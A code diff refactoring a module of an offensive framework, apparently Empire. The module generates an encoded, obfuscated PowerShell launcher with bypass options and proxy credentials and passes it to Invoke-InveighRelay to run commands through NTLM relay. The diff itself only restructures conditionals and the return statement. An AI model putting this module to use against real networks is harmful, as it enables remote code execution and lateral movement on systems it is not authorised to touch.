@@ -36,23 +36,22 @@ class Module:
                 # not a valid listener, return nothing for the script
                 return handle_error_message("[!] Invalid listener: " + listener_name)
 
-            else:
-                # generate the PowerShell one-liner with all of the proper options set
-                command = main_menu.stagergenv2.generate_launcher(
-                    listener_name=listener_name,
-                    language="powershell",
-                    encode=True,
-                    obfuscate=launcher_obfuscate,
-                    obfuscation_command=launcher_obfuscate_command,
-                    user_agent=user_agent,
-                    proxy=proxy,
-                    proxy_creds=proxyCreds,
-                    bypasses=params["Bypasses"],
-                )
+            # generate the PowerShell one-liner with all of the proper options set
+            command = main_menu.stagergenv2.generate_launcher(
+                listener_name=listener_name,
+                language="powershell",
+                encode=True,
+                obfuscate=launcher_obfuscate,
+                obfuscation_command=launcher_obfuscate_command,
+                user_agent=user_agent,
+                proxy=proxy,
+                proxy_creds=proxyCreds,
+                bypasses=params["Bypasses"],
+            )
 
-                # check if launcher errored out. If so return nothing
-                if command == "":
-                    return handle_error_message("[!] Error in launcher generation.")
+            # check if launcher errored out. If so return nothing
+            if command == "":
+                return handle_error_message("[!] Error in launcher generation.")
 
         # set defaults for Empire
         script_end = "\n" + f'Invoke-InveighRelay -Tool "2" -Command \\"{command}\\"'
@@ -73,17 +72,15 @@ class Module:
                 if values.lower() == "true":
                     # if we're just adding a switch
                     script_end += " -" + str(option)
+                elif "," in str(values):
+                    quoted = '"' + str(values).replace(",", '","') + '"'
+                    script_end += " -" + str(option) + " " + quoted
                 else:
-                    if "," in str(values):
-                        quoted = '"' + str(values).replace(",", '","') + '"'
-                        script_end += " -" + str(option) + " " + quoted
-                    else:
-                        script_end += " -" + str(option) + ' "' + str(values) + '"'
+                    script_end += " -" + str(option) + ' "' + str(values) + '"'
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
